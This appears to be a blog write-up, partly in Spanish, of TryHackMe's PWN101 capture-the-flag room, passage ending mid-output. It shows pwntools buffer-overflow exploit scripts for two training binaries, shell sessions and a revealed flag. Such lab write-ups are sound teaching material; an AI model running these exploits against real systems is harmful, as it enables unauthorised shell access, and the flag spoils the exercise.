@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>PWN101 TryHackMe Room | abund4nt</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="64-bit binary / Room">
+    <meta name="generator" content="Hugo 0.123.7">
+    
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+      <meta name="author" content = "abund4nt">
+    
+
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="https://abund4nt.github.io/pwn/pwn101-tryhackme-room/">
+    
+
+    <meta property="og:title" content="PWN101 TryHackMe Room" />
+<meta property="og:description" content="64-bit binary / Room" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://abund4nt.github.io/pwn/pwn101-tryhackme-room/" /><meta property="article:section" content="pwn" />
+<meta property="article:published_time" content="2024-07-19T10:38:21-04:00" />
+<meta property="article:modified_time" content="2024-07-19T10:38:21-04:00" />
+
+<meta itemprop="name" content="PWN101 TryHackMe Room">
+<meta itemprop="description" content="64-bit binary / Room"><meta itemprop="datePublished" content="2024-07-19T10:38:21-04:00" />
+<meta itemprop="dateModified" content="2024-07-19T10:38:21-04:00" />
+<meta itemprop="wordCount" content="1080">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/><meta name="twitter:title" content="PWN101 TryHackMe Room"/>
+<meta name="twitter:description" content="64-bit binary / Room"/>
+
+	
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        abund4nt
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+        <ul class="pl0 mr3">
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/crypto/" title="Crypto page">
+              Crypto
+            </a>
+          </li>
+          
+          <li class="list f5 f4-ns fw4 dib pr3">
+            <a class="hover-white no-underline white-90" href="/pwn/" title="Pwn page">
+              Pwn
+            </a>
+          </li>
+          
+        </ul>
+      
+      
+<div class="ananke-socials">
+  
+    
+    <a href="https://github.com/abund4nt" target="_blank" rel="noopener" class="github ananke-social-link link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="GitHub link" aria-label="follow on GitHub——Opens in a new window">
+      
+        <span class="icon"><svg style="enable-background:new 0 0 512 512;" version="1.1" viewBox="0 0 512 512"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+  <path d="M256,32C132.3,32,32,134.8,32,261.7c0,101.5,64.2,187.5,153.2,217.9c11.2,2.1,15.3-5,15.3-11.1   c0-5.5-0.2-19.9-0.3-39.1c-62.3,13.9-75.5-30.8-75.5-30.8c-10.2-26.5-24.9-33.6-24.9-33.6c-20.3-14.3,1.5-14,1.5-14   c22.5,1.6,34.3,23.7,34.3,23.7c20,35.1,52.4,25,65.2,19.1c2-14.8,7.8-25,14.2-30.7c-49.7-5.8-102-25.5-102-113.5   c0-25.1,8.7-45.6,23-61.6c-2.3-5.8-10-29.2,2.2-60.8c0,0,18.8-6.2,61.6,23.5c17.9-5.1,37-7.6,56.1-7.7c19,0.1,38.2,2.6,56.1,7.7   c42.8-29.7,61.5-23.5,61.5-23.5c12.2,31.6,4.5,55,2.2,60.8c14.3,16.1,23,36.6,23,61.6c0,88.2-52.4,107.6-102.3,113.3   c8,7.1,15.2,21.1,15.2,42.5c0,30.7-0.3,55.5-0.3,63c0,6.1,4,13.3,15.4,11C415.9,449.1,480,363.1,480,261.7   C480,134.8,379.7,32,256,32z"/>
+</svg>
+</span>
+      
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000"  xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;"/>
+</svg>
+</span></a>
+  
+</div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Binary Explotation
+      </aside>
+      
+
+
+
+
+
+
+
+
+
+
+  <div id="sharing" class="mt3 ananke-socials">
+    
+  </div>
+
+
+      <h1 class="f1 athelas mt3 mb1">PWN101 TryHackMe Room</h1>
+      
+      <p class="tracked">
+        By <strong>abund4nt</strong>
+      </p>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2024-07-19T10:38:21-04:00">July 19, 2024</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links black pr4-l w-two-thirds-l"><p>Hi guys this time I bring you the write-up of the PWN101 room of TryHackMe, this room consists of 10 challenges about binary exploitation in 64-bit binaries, I have learned a lot doing these challenges and have been of great contribution to my knowledge.</p>
+<p>En este writeup a resolver los siguientes challenges:</p>
+<ul>
+<li>pwn101 (Exploiting Simple Buffer Overflow)</li>
+<li>pwn102 (Buffer Overflow to modified variable values)</li>
+<li>pwn103 (Execution Flow Hijacking)</li>
+<li>pwn104 (Shellcode Execution)</li>
+</ul>
+<p>Let&rsquo;s go with the solutions!</p>
+<h1 id="pwn101">pwn101</h1>
+<p>En este primer desafio nos entrenga un binario llamado <code>pwn101.pwn101</code> y una instancia remota para conectarnos. El binario tiene las siguientes protecciones.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>Stack:    No canary found
+</span></span><span style="display:flex;"><span>NX:       NX enabled
+</span></span><span style="display:flex;"><span>PIE:      PIE enabled
+</span></span></code></pre></div><p>Vamos a utilizar Ghidra para ver la funcion <code>main</code>, el codigo que nos muestra la herramienta es el siguiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_48 [<span style="color:#ae81ff">60</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x539</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">banner</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;Hello!, I am going to shopping.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">My mom told me to buy some ingredients.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Ummm.. But I have l ow memory capacity, So I forgot most of them.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Anyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>      );
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Type the required ingredients to make briyani: &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(local_48);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x539</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Nah bruh, you lied me :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">She did Tomato rice instead of briyani :/&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0x539</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Thanks, Here</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s a small gift for you &lt;3&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="analisis-del-codigo-fuente">Analisis del codigo fuente</h2>
+<p>Tenemos un buffer de 60 bytes definido en la variable <code>local_48</code> y luego toma nuestro input con la variable <code>gets()</code>, si nuestro input es igual a la direccion de memoria <code>0x539</code> nos muestra un error, si no es igual nos da una reverse shell utilizando <code>system(&quot;/bin/sh&quot;)</code>. Esto lo podemos comprobar si ejecutamos el binario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./pwn101-1644307211706.pwn101
+</span></span><span style="display:flex;"><span>       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+</span></span><span style="display:flex;"><span>        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
+</span></span><span style="display:flex;"><span>        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+</span></span><span style="display:flex;"><span>                 pwn <span style="color:#ae81ff">101</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hello!, I am going to shopping.
+</span></span><span style="display:flex;"><span>My mom told me to buy some ingredients.
+</span></span><span style="display:flex;"><span>Ummm.. But I have low memory capacity, So I forgot most of them.
+</span></span><span style="display:flex;"><span>Anyway, she is preparing Briyani <span style="color:#66d9ef">for</span> lunch, Can you help me to buy those items :D
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type the required ingredients to make briyani:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>Nah bruh, you lied me :<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>She did Tomato rice instead of briyani :/
+</span></span></code></pre></div><p>Estamos ante un Buffer Overflow ya que debemos superar los 60 bytes del buffer y conseguir la shell interactiva que nos da el programa.</p>
+<h2 id="solution">Solution</h2>
+<p>Con el siguiente script logramos resolver el desafio en local.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./pwn101-1644307211706.pwn101&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Type the required ingredients to make briyani: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Al ejecutarlo obtenemos la shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 exploit-local.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./pwn101-1644307211706.pwn101&#39;</span>: pid <span style="color:#ae81ff">34980</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Thanks, Here<span style="color:#960050;background-color:#1e0010">&#39;</span>s a small gift <span style="color:#66d9ef">for</span> you &lt;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>luk4s
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>luk4s<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>luk4s<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>luk4s<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,114<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="flag">Flag</h2>
+<p>Con el siguiente script resolvemos el desafio en remoto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Usage: python3 exploit-remote.py &lt;ip:port&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> get_process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Type the required ingredients to make briyani: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">120</span>)
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Al ejecutarlo obtenemos la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 exploit-remote.py 10.10.48.200:9001
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 10.10.48.200 on port 9001: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Thanks, Here a small gift <span style="color:#66d9ef">for</span> you &lt;<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>pwn101
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>flag.txt
+</span></span><span style="display:flex;"><span>pwn101
+</span></span><span style="display:flex;"><span>pwn101.c
+</span></span><span style="display:flex;"><span>$ cat flag.txt
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>7h4t<span style="color:#960050;background-color:#1e0010">&#39;</span>s_4n_3zy_oveRflowwwww<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="pwn102">pwn102</h1>
+<p>En este desafio nos entrega un binario llamado <code>pwn102.pwn102</code> y una instancia remota para conectarnos. El binario cuenta con las siguientes protecciones.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>Stack:    No canary found
+</span></span><span style="display:flex;"><span>NX:       NX enabled
+</span></span><span style="display:flex;"><span>PIE:      PIE enabled
+</span></span></code></pre></div><p>Utilizaremos Ghidra para ver la funcion <code>main()</code> del binario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  undefined local_78 [<span style="color:#ae81ff">104</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_10;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">banner</span>();
+</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbadf00d</span>;
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x11e2153</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;I need %x to %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Am I right? &#34;</span>,<span style="color:#ae81ff">0xbadf00d</span>,<span style="color:#ae81ff">0xfee1dead</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#f92672">&amp;</span>DAT_00100b66,local_78);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc0ff33</span>) <span style="color:#f92672">&amp;&amp;</span> (local_10 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc0d3</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Yes, I need %x to %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0xc0ff33</span>,<span style="color:#ae81ff">0xc0d3</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m feeling dead, coz you said I need bad food :(&#34;</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0x539</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="analisis-del-codigo-fuente-1">Analisis del codigo fuente</h2>
+<p>Vemos que define una variable llamada <code>local_78</code> con un buffer de <code>104</code> bytes. Luego nos dice quenecesita las direcciones de memoria <code>0xbadf00d</code> y <code>0xfee1dead</code>, podemos comprobar esto al ejecutar el binario.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./pwn102-1644307392479.pwn102
+</span></span><span style="display:flex;"><span>       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+</span></span><span style="display:flex;"><span>        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
+</span></span><span style="display:flex;"><span>        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+</span></span><span style="display:flex;"><span>                 pwn <span style="color:#ae81ff">102</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I need badf00d to fee1dead
+</span></span><span style="display:flex;"><span>Am I right? test
+</span></span><span style="display:flex;"><span>I<span style="color:#960050;background-color:#1e0010">&#39;</span>m feeling dead, coz you said I need bad food :<span style="color:#f92672">(</span>
+</span></span></code></pre></div><p>Pero en verdad el binario espera que la variable <code>local_c</code> tenga un valor de <code>0xc0ff33</code> y <code>local_10</code> tenga un valor de <code>0xc0d3</code>, si ambas condiciones se cumplen nos entrega una shell interactiva. Entonces lo que tenemos que hacer es llenar el Buffer y modificar pasar el valor de las variables que esta esperando el binario.</p>
+<h2 id="solucion">Solucion</h2>
+<p>Utilizando el siguiente script lograremos resolver el desafio en local.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Process</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./pwn102-1644307392479.pwn102&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">104</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xc0d3</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xc0ff33</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Am I right? &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>Al ejecutar el script nos dara una shell interactiva.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 solve-local.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./pwn102-1644307392479.pwn102&#39;</span>: pid <span style="color:#ae81ff">202135</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>Yes, I need c0ff33 to c0d3
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>luk4s<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>luk4s<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>luk4s<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,114<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>luk4s
+</span></span></code></pre></div><h2 id="flag-1">Flag</h2>
+<p>Con el siguiente script resolvemos el desafio en la instacia remota.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Usage: python3 exploit-remote.py &lt;ip:port&gt;&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    host, port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> get_process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Payload</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">104</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xc0d3</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0xc0ff33</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send payload</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Am I right? &#39;</span>, payload)
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>Al ejecutar el script obtenemos la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 solve-remote.py 10.10.79.145:9002
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 10.10.79.145 on port 9002: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
